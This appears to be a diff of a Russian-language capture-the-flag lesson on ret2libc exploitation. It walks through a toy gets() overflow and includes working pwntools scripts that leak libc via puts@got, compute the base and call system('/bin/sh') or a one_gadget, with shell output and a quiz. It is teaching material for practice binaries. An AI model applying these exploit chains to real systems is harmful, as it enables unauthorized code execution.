@@ -14,78 +14,105 @@ useful_for:
 estimated_minutes: 60
 summary: "Строим полноценный эксплойт: утекаем libc, вычисляем базу и вызываем system('/bin/sh') или one_gadget — обход ASLR через ret2libc."
 ---
-**ret2libc** — базовый и самый частый приём бинарной эксплуатации: переполнение стека + вызов `system("/bin/sh")` из libc. Проблема — ASLR: адрес `system` рандомизирован при каждом запуске, поэтому сначала **утекаем** адрес libc (через GOT или format string), вычисляем базу и только затем вызываем. Это полноценный эксплойт с двумя round-trip, и он — обязательный навык для любой задачи с NX и включённым ASLR.
 
-## Почему нужен leak
+## Вопрос, с которого всё начинается
 
-- libc загружается по случайному адресу (ASLR) — при каждом запуске своя база.
-- Чтобы вызвать `system`, нужно знать `libc_base + system_offset` (офсет фиксирован для данной libc).
-- Утечка: прочитать GOT-запись **уже вызванной** функции (`puts@got`) — там лежит её реальный адрес.
-- Зная реальный адрес `puts` и его офсет в libc, вычисляем `libc_base = leak - puts_offset`.
+В бинаре есть переполнение, но нет функции `win`, которая открывает shell. Зато точно есть libc — а в libc есть `system`. Проблема одна: **ASLR** грузит libc по случайному адресу при каждом запуске. Ты не знаешь, куда прыгать.
 
-## Триаж и смещение до RIP
+Но у тебя есть утечка из прошлого урока. Сегодня мы соберём полноценный эксплойт: сначала узнаем адрес libc, потом вызовем `system("/bin/sh")`. Это **ret2libc** — самый частый приём в pwn.
 
-```bash
-checksec --file=./chall
-# Arch: amd64-64-little
-# RELRO: Partial RELRO
-# Stack: No canary found
-# NX:    NX enabled
-# PIE:   No PIE (0x400000)
+## Наш пример: тот же chall
+
+```c
+#include <stdio.h>
+int main(void) {
+    char buf[64];
+    puts("Input:");
+    gets(buf);
+    return 0;
+}
 ```
 
-Non-PIE, NX, без canary, с ASLR и без `win()` → единственный путь — ret2libc. Находим смещение до адреса возврата:
-
 ```bash
-python3 -c "from pwn import *; print(cyclic(200).decode())" > /tmp/pat
-gdb -q ./chall -ex 'run < /tmp/pat' -ex 'info registers rip'
-# RIP = 0x6161616c (перезаписан паттерном)
-python3 -c "from pwn import *; print(cyclic_find(0x6161616c))"   # -> 72
+$ gcc -fno-stack-protector -no-pie -o chall chall.c
+$ checksec --file=./chall
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
 ```
 
-Смещение 72 = размер буфера (64) + сохранённый RBP (8).
+NX включён — shellcode на стеке не запустить. `win` нет. Non-PIE — значит адреса бинаря фиксированы. Единственный путь — ret2libc.
 
-## Round 1: утечка libc через puts
+## Шаг 1. Смещение до адреса возврата
 
-Возвращаемся в `main`, чтобы получить второй ввод. `main` в non-PIE имеет фиксированный адрес, `puts@plt`/`puts@got` — из таблиц ELF:
+Сначала найдём, через сколько байт мы дотягиваемся до сохранённого `rip`. Используем паттерн:
+
+```bash
+$ python3 -c "from pwn import *; print(cyclic(200).decode())" > /tmp/pat
+$ gdb -q ./chall -ex 'run < /tmp/pat' -ex 'info registers rip'
+RIP = 0x6161616c
+$ python3 -c "from pwn import *; print(cyclic_find(0x6161616c))"
+72
+```
+
+Смещение `72` = буфер 64 + сохранённый `rbp` 8. Никогда не угадывай его «на глаз» — `cyclic_find` обязателен.
+
+## Шаг 2. Первый раунд: утечка libc
+
+Из урока про GOT мы знаем: `puts(puts@got)` печатает реальный адрес `puts` в libc. Соберём цепочку и **вернёмся в `main`**, чтобы получить второй ввод:
 
 ```python
 from pwn import *
 context.binary = elf = ELF('./chall')
-libc = ELF('./libc.so.6')
+libc = ELF('./libc.so.6', checksec=False)
 
 p = process('./chall')
 rop = ROP(elf)
-rop.call(elf.plt['puts'], [elf.got['puts']])   # puts(puts@got) -> печатает реальный адрес
-rop.call(elf.symbols['main'])                 # вернуться в main для round 2
-p.sendlineafter(b'>', flat({72: rop.chain()}))
+rop.call(elf.plt['puts'], [elf.got['puts']])   # puts(puts@got)
+rop.call(elf.symbols['main'])                  # вернуться в main
+p.sendlineafter(b'Input:\n', flat({72: rop.chain()}))
 
 leak = u64(p.recvline().strip().ljust(8, b'\x00'))
 libc.address = leak - libc.symbols['puts']
 log.success(f'libc base = {hex(libc.address)}')
 ```
 
-`rop.call(plt, [got])` собирает цепочку: `pop rdi; ret` (для аргумента) + `puts@plt` + адрес возврата `main`. `u64(...ljust(8, b'\x00'))` дополняет утечку до 8 байт (puts печатает до нуля).
+```text
+[+] libc base = 0x7ffff7dc0000
+```
 
-## Round 2: system("/bin/sh")
+`rop.call(plt, [got])` собирает цепочку из `pop rdi; ret`, адреса `puts@plt` и адреса возврата `main`. `ljust(8, b'\x00')` дополняет утечку: `puts` печатает только до первого нулевого байта.
+
+Ключевой момент: **база libc = утёкший адрес − оффсет `puts`**. Оффсет фиксирован для данной libc, поэтому одно вычитание даёт нам всю библиотеку.
+
+## Шаг 3. Второй раунд: system("/bin/sh")
+
+Теперь, когда `libc.address` установлен, pwntools сам считает абсолютные адреса. Собираем вторую цепочку:
 
 ```python
 rop2 = ROP(libc)
 rop2.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])
-p.sendlineafter(b'>', flat({72: rop2.chain()}))
+p.sendlineafter(b'Input:\n', flat({72: rop2.chain()}))
 p.interactive()
 ```
 
-`ROP(libc)` использует уже установленный `libc.address` для вычисления абсолютных адресов гаджетов и символов. Строку `/bin/sh` ищем в самой libc (`libc.search`).
+```text
+[*] Switching to interactive mode
+$ id
+uid=1000(user) gid=1000(user)
+```
 
-## One-gadget
+`ROP(libc)` использует уже заданный `libc.address` как базу. Строку `/bin/sh` ищем прямо в libc через `libc.search`. Порядок обязателен: **сначала утечка, потом `system`** — без базы мы не знаем адрес `system`.
 
-Если нет удобного `pop rdi` или строки `/bin/sh`, используют **one_gadget** — адрес внутри libc, вызывающий `execve("/bin/sh")` при выполнении условий:
+## Шаг 4. Если `pop rdi` нет: one_gadget
+
+Иногда в бинаре нет `pop rdi; ret`, или места под длинную цепочку мало. Тогда используют **one_gadget** — волшебный адрес внутри libc, при переходе на который сразу вызывается `execve("/bin/sh")`:
 
 ```bash
-one_gadget ./libc.so.6
-# 0xe3afe execve("/bin/sh", r15, r12)
-# constraints: [r15] == NULL || r15 == NULL || r12 == NULL
+$ one_gadget ./libc.so.6
+0xe3afe execve("/bin/sh", r15, r12)
+constraints: [r15] == NULL || r15 == NULL || r12 == NULL
 ```
 
 ```python
@@ -93,111 +120,80 @@ one = libc.address + 0xe3afe
 payload = flat({72: p64(one)})
 ```
 
-Проверьте ограничения (нулевые регистры/память) — часто нужно «обнулить» их предыдущими гаджетами (`pop r15; ret`). One-gadget удобен, когда нет места под длинную цепочку.
+У one_gadget есть **constraints** — условия на регистры (обычно они должны быть нулевыми). Если условия не выполнены, процесс упадёт. Поэтому one_gadget удобен, но требует проверки.
 
-## Определение версии libc
+## Разбор утечки через GOT и повторный вызов main
 
-Если libc не дана, используйте утечку + `libc-database`:
+Первый этап ret2libc стоит разобрать по шагам ещё раз, потому что именно здесь чаще всего ломается эксплойт. Переполнение возвращает управление на `puts@plt` с аргументом `puts@got` (через `pop rdi; ret`), а затем — в `main`, чтобы получить второй раунд. `puts` печатает 8 байт адреса из GOT; мы читаем их через `u64(p.recvline().strip().ljust(8, b'\x00'))`, вычисляем базу и строим второй payload. Важно: при возврате в `main` стек должен быть корректным, а выравнивание — учтено. Если `main` не подходит (например, меняет состояние), вернись в начало уязвимой функции. Для 32-битных бинарей аргументы передаются на стеке — цепочка проще, `pop rdi` не нужен.
 
-```bash
-./find puts 6f0            # поиск по последним 3 нибблам адреса puts
-./find printf f7a0 b40
-```
+## Шаг 5. Стабилизация
 
-Собрав кандидатов, проверьте их на совпадение второго leak (например, `__libc_start_main`). См. `pwn-libc-database`.
+Если shell не поднимается — проверь по порядку:
 
-## Разобранный пример: от триажа до shell
+- **Выравнивание стека.** Добавь лишний `ret`-гаджет перед `system`: многие SSE-инструкции в libc (`movaps`) требуют, чтобы `rsp` был выровнен по 16. Это классическая причина краха «почти рабочего» эксплойта.
+- **Парсинг утечки.** Первая строка вывода может содержать мусор — используй `recvuntil`.
+- **Версия libc.** Оффсет `puts` из другой версии даст мусорную базу. Сверяй младшие 12 бит.
+- **Отладка.** `gdb.attach(p, 'b system\nc')` — посмотри, доходит ли управление до `system`.
 
-```text
-Шаг 1. checksec: NX enabled, No canary, No PIE, Partial RELRO.
-Шаг 2. cyclic -> смещение 72 до RIP.
-Шаг 3. Round 1: puts(puts@got) + return to main -> leak -> libc_base.
-Шаг 4. Round 2: system("/bin/sh") -> interactive.
-Шаг 5. Стабилизация: выравнивание стека, повторный leak при нестабильности.
-```
+## Шаг 6. Когда классический ret2libc не работает
 
-Важная деталь: `main` в non-PIE имеет фиксированный адрес, а `puts@plt`/`puts@got` берутся из таблиц ELF — поэтому возврат в `main` возможен без знания базы бинаря.
-
-**Стабилизация.** Если shell не поднимается:
-
-- **Выравнивание стека.** Добавьте лишний `ret`-гаджет перед `system` (SSE/`movaps` требует 16-байтного выравнивания).
-- **Корректность утечки.** Первая строка вывода может содержать мусор — используйте `recvuntil`.
-- **`puts` съел лишние байты.** Проверьте формат ответа.
-- **Отладка.** `gdb.attach(p, 'b system\nc')`.
-
-## Варианты, когда классический ret2libc не работает
-
-- **Нет гаджета `pop rdi`.** Используйте **ret2csu** (`__libc_csu_init` содержит гаджеты для RDI/RSI/RDX) или поищите `pop rdi; ret` в libc (если её база известна). См. `pwn-ret2csu`.
-- **Нет строки `/bin/sh` в libc.** Запишите её в `.bss` через `read` (цепочка: `read(0, bss, 8)` → `system(bss)`), либо используйте `/bin/sh` из другой загруженной библиотеки.
-- **Статическая линковка (нет libc).** Переходите на **ret2syscall**: `rax=59 (execve)`, `rdi=/bin/sh`, `rsi=0`, `rdx=0`, `syscall`. Или ORW (open/read/write) при seccomp. См. `pwn-static-no-libc`.
-- **seccomp запрещает execve.** Тогда только ORW: `open("flag")`, `read`, `write`. См. `pwn-seccomp-srop`.
-- **Canary.** Сначала утечь canary (через `puts`/форматную строку) и восстановить её в payload. См. `pwn-canary-bypass`.
-- **PIE + no leak.** Нужна утечка базы бинаря (например, через форматную строку или `puts` адреса в `.text`). См. `pwn-pie-bypass`.
-- **Утечка через форматную строку.** Если есть `printf(buf)` и нет удобного `puts`, используйте `%p`/`%s` для чтения GOT. См. `pwn-format-string`.
+- **Нет `pop rdi`** → ret2csu (`pwn-ret2csu`) или `pop rdi` из libc.
+- **Нет строки `/bin/sh`** → запиши её в `.bss` через `read`, затем `system(bss)`.
+- **Статическая линковка (нет libc)** → ret2syscall: `rax=59`, `rdi=/bin/sh`, `syscall` (`pwn-static-no-libc`).
+- **seccomp запрещает execve** → только ORW: `open("flag")`, `read`, `write` (`pwn-seccomp-srop`).
+- **Canary** → сначала утечь и восстановить canary (`pwn-canary-bypass`).
+- **PIE** → нужна утечка базы бинаря (`pwn-pie-bypass`).
 
 ## Справочник: офсеты и гаджеты
 
-Типичные шаги при работе с libc:
+Типичные шаги при работе с libc в pwntools:
 
 ```python
 from pwn import *
 libc = ELF('./libc.so.6')
-print(hex(libc.symbols['system']))          # офсет system
-print(hex(libc.symbols['puts']))            # офсет puts (для leak)
-print(hex(next(libc.search(b'/bin/sh'))))   # офсет строки
-rop = ROP(libc)
-print(rop.find_gadget(['pop rdi', 'ret']))  # гаджет pop rdi; ret
+print(hex(libc.symbols['system']))          # оффсет system
+print(hex(libc.symbols['puts']))            # оффсет puts (для leak)
+print(hex(next(libc.search(b'/bin/sh'))))   # оффсет строки
+print(ROP(libc).find_gadget(['pop rdi','ret']))  # гаджет pop rdi; ret
 ```
 
 | Что | Как получить |
-|-----|--------------|
+|---|---|
 | `libc_base` | `leak_puts - libc.symbols['puts']` |
 | `system` | `libc_base + libc.symbols['system']` |
 | `/bin/sh` | `libc_base + next(libc.search(b'/bin/sh'))` |
-| `pop rdi; ret` | `libc_base + rop.find_gadget(['pop rdi','ret']).address` |
+| `pop rdi; ret` | `libc_base + ROP(libc).find_gadget(['pop rdi','ret']).address` |
 | one_gadget | `libc_base + <offset из one_gadget>` |
 
-Проверка совпадения libc: сравните **два** leak (например, `puts` и `__libc_start_main`) — совпадение обоих подтверждает версию.
+## Определение версии libc
 
-## Частые ошибки
+Если libc не дана, её находят по утечке через `libc-database`:
 
-- **Неверный офсет до RIP.** `cyclic_find` обязателен — «на глаз» почти всегда мимо.
-- **Не та libc.** Офсеты различаются; определите версию (libc-database).
-- **Не сбросить `libc.address`.** `libc.symbols[...]` вернёт офсет, а не адрес — устанавливайте базу.
-- **Забыть вернуться в main.** Без второго round-trip нельзя вызвать `system` после утечки.
-- **One-gadget без условий.** Падает, если constraints не выполнены.
-- **Canary.** При включённой canary нужен её обход (см. `pwn-canary-bypass`).
-- **Выравнивание.** Лишний `ret` перед `system` (SSE) — классическая причина краха.
+```bash
+$ ./find puts 6f0
+```
 
-## Что делать дальше / решение
+Младшие 12 бит адреса символа не зависят от ASLR — их достаточно для поиска. Для надёжности используй утечку двух-трёх символов (`puts`, `read`, `system`): комбинация уникальна. Подробнее — в `pwn-libc-database`.
 
-1. `checksec` + определение смещения (`cyclic`).
-2. Round 1: утечка `puts@got`, возврат в `main`.
-3. Вычисление `libc_base`; при неизвестной libc — подбор через libc-database.
-4. Round 2: `system("/bin/sh")` или one_gadget.
-5. Стабилизация: выравнивание, корректный парсинг утечки.
-6. Переход к интерактивной сессии; при canary/PIE — предварительный обход.
+## На что смотреть дальше
 
+- **Утечка должна быть из libc** — адреса начинаются с `0x7f`. Если нет, ты утёк что-то другое.
+- **`libc.symbols` до установки `libc.address` возвращают оффсеты**, а не адреса. Не забудь задать базу.
+- **Второй round-trip обязателен** — после утечки нужен возврат в `main` для вызова `system`.
+- **Выравнивание** — самая частая причина «непонятного» краха.
+- **Canary и PIE** обходятся до ret2libc, а не в его процессе.
 
-## Финальные рекомендации по ret2libc
+## Что мы теперь знаем
 
-Ключевые шаги: (1) утеките адрес libc-функции (через `puts@got`/format string); (2) определите версию libc (`libc-database`/`libc.rip`); (3) вычислите базу (`libc.address = leak - offset`); (4) найдите гаджеты (`pop rdi; ret`) и адреса `system`/`"/bin/sh"`; (5) соберите цепочку с учётом выравнивания стека. Проверяйте локально на той же libc. Практикуйтесь — ret2libc встречается повсеместно.
-
-
-## Полный разбор ret2libc-эксплойта
-
-Разберём сквозной пример. Дано: 64-битный бинарь с переполнением, NX, ASLR, PIE (с утечкой базы). Цель — `system("/bin/sh")`. Шаги: (1) найдите offset до сохранённого RIP (cyclic + gdb); (2) найдите гаджет `pop rdi; ret`; (3) постройте первый этап: утечка `puts@got` через вызов `puts(puts@got)` и возврат в `main` (для второго этапа); (4) получите утечку, определите libc (`libc-database`); (5) вычислите `libc.address = leak - libc.symbols['puts']`; (6) найдите `system` и `"/bin/sh"`; (7) постройте второй этап: `pop rdi; binsh; ret (выравнивание); system`. Проверяйте локально на той же libc. Помните про выравнивание стека (лишний `ret`) и про то, что `system` требует `rdi = "/bin/sh"`. Если `system` нет, используйте `one_gadget` или `execve`. Практикуйтесь: ret2libc — базовый навык, встречающийся повсеместно.
-
-## Разбор утечки через GOT и повторный вызов main
-
-Первый этап ret2libc часто строят так: переполнение возвращает управление на `puts@plt` с аргументом `puts@got` (через `pop rdi; ret`), затем возвращает в `main` для второго раунда. `puts` печатает 8 байт адреса `puts` из GOT, вы читаете их (`u64(p.recvline().strip().ljust(8,b'\x00'))`), вычисляете базу libc и строите второй payload. Важно: при возврате в `main` стек должен быть корректным, а выравнивание — учтено. Если `main` не подходит (например, меняет состояние), вернитесь в начало уязвимой функции. Для 32-битных бинарей аргументы передаются на стеке, что упрощает цепочку (не нужны `pop rdi`). Практикуйтесь на обоих вариантах — ret2libc фундаментален.
-
-
-## Дополнительно
-
-Помните, что `libc.symbols` дают смещения только после установки `libc.address`; до этого они относительны. Проверяйте, что утечка действительно из libc (адреса начинаются с `0x7f`), а не из PIE-бинаря. При выравнивании добавляйте один `ret` перед вызовом функции, если стек смещён. Практикуйтесь, и ret2libc станет для вас рутиной.
+- ret2libc обходит ASLR в два шага: утечка базы, затем `system`.
+- База libc = утёкший адрес функции − её оффсет.
+- `ROP(libc)` после установки `libc.address` считает абсолютные адреса.
+- one_gadget даёт shell одним прыжком, но с условиями на регистры.
+- Выравнивание стека (`ret` перед `system`) — частая причина краха.
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "Зачем в ret2libc нужна утечка libc?"
@@ -218,7 +214,7 @@ print(rop.find_gadget(['pop rdi', 'ret']))  # гаджет pop rdi; ret
   explanation: "puts@got содержит реальный адрес puts, по нему вычисляют базу libc."
 - question: "Что делает ROP(libc) после установки libc.address?"
   options:
-    - "Вычисляет абсолютные адреса гаджетов/символов libc"
+    - "Вычисляет абсолютные адреса гаджетов и символов libc"
     - "Собирает бинарь"
     - "Отключает ASLR"
     - "Сканирует порты"
@@ -241,6 +237,10 @@ print(rop.find_gadget(['pop rdi', 'ret']))  # гаджет pop rdi; ret
   answer: 0
   explanation: "После утечки возврат в main позволяет отправить второй payload с system."
 ```
+
+## Куда дальше
+
+В `pwn-fini-init-array` мы разберём, что делать, когда GOT защищён Full RELRO и перезаписать его нельзя — тогда целью становятся массивы `.fini_array`/`.init_array`. А пока главное: **ret2libc = утечка базы libc + `system("/bin/sh")`; два раунда, и ASLR больше не помеха.**
 
 ## Где пригодится
 
